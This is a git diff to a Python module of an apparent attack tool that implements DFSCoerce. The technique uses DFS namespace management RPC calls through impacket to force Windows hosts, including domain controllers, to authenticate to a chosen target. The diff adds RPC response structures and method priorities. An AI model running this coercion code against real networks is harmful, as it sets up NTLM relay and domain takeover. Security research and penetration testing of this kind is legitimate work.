@@ -5,7 +5,7 @@ DFSCoerce - uses DFS namespace management RPC calls.
 
 from __future__ import annotations
 
-from impacket.dcerpc.v5.dtypes import DWORD, WSTR
+from impacket.dcerpc.v5.dtypes import DWORD, LONG, WSTR
 from impacket.dcerpc.v5.ndr import NDRCALL
 
 from coercex.methods.base import CoercionMethod, PipeBinding
@@ -40,6 +40,10 @@ class _NetrDfsAddStdRoot(NDRCALL):
     )
 
 
+class _NetrDfsAddStdRootResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
+
+
 class _NetrDfsRemoveStdRoot(NDRCALL):
     opnum = 13
     structure = (
@@ -47,6 +51,10 @@ class _NetrDfsRemoveStdRoot(NDRCALL):
         ("RootShare", WSTR),
         ("ApiFlags", DWORD),
     )
+
+
+class _NetrDfsRemoveStdRootResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
 
 
 def _trigger_add_std_root(dce, path, target):
@@ -78,6 +86,7 @@ def get_methods() -> list[CoercionMethod]:
             pipe_bindings=list(DFSNM_PIPES),
             path_styles=list(DFSNM_PATH_STYLES),
             trigger_fn=_trigger_add_std_root,
+            priority=3,  # DFSCoerce - works on DCs with DFS role
         ),
         CoercionMethod(
             protocol_short=PROTOCOL_SHORT,
@@ -88,5 +97,6 @@ def get_methods() -> list[CoercionMethod]:
             pipe_bindings=list(DFSNM_PIPES),
             path_styles=list(DFSNM_PATH_STYLES),
             trigger_fn=_trigger_remove_std_root,
+            priority=3,  # DFSCoerce variant
         ),
     ]
